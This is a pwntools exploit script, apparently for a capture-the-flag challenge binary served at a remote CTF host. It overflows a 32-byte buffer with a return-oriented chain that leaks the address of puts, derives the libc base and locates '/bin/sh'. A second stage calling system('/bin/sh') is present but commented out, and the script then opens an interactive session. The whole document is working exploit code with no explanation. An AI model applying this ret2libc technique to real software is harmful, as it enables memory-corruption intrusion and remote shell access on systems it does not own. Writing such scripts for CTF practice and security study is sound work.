from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "debug"

io = remote("nc1.ctfplus.cn", 11459)
elf = ELF("./pwn")
rop = ROP(elf)
libc = ELF("./libc.so.6")

sa = io.sendafter
sl = io.sendline
sla = io.sendlineafter

global_msg = 0x404080
global_msg_buf_size = 200
dest_buf_siz = 32

pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address

log.debug("1")
sla(b": ", b"1")
sa(
    b": ", 
    flat(
        b'A' * (dest_buf_siz + 8),

        pop_rdi, elf.got["puts"],
        elf.plt["puts"],

        elf.symbols["main"]
    ).ljust(global_msg_buf_size, b"A")
)

log.debug("2")
sla(b": ", b"2")
sla(b": ", str(dest_buf_siz).encode())

log.debug("3")
sla(b": ", b"3")

log.debug("2")
sa(b"y...", b"2\n")
sa(b": ", str(global_msg_buf_size).encode())

io.recvuntil(b"d...\n")
puts = u64(io.recv(6).ljust(8, b"\x00"))
log.debug("Address of 'puts':\n" + hexdump(puts))

libc.address = puts - libc.sym["puts"]
binsh = next(libc.search(b"/bin/sh\x00"))

# log.debug("1")
# sla(b": ", b"1")
# sa(
#     b": ",
#     flat(
#         b"A" * (dest_buf_siz + 8),

#         pop_rdi, binsh,
#         libc.symbols["system"]
#     ).ljust(global_msg_buf_size, b"A")
# )

# log.debug("2")
# sla(b": ", b"2")
# sla(b": ", str(dest_buf_siz).encode())

# log.debug("3")
# sla(b": ", b"3")

# log.debug("2")
# sa(b"y...", b"2\n")
# sl(str(global_msg_buf_size).encode())

io.interactive()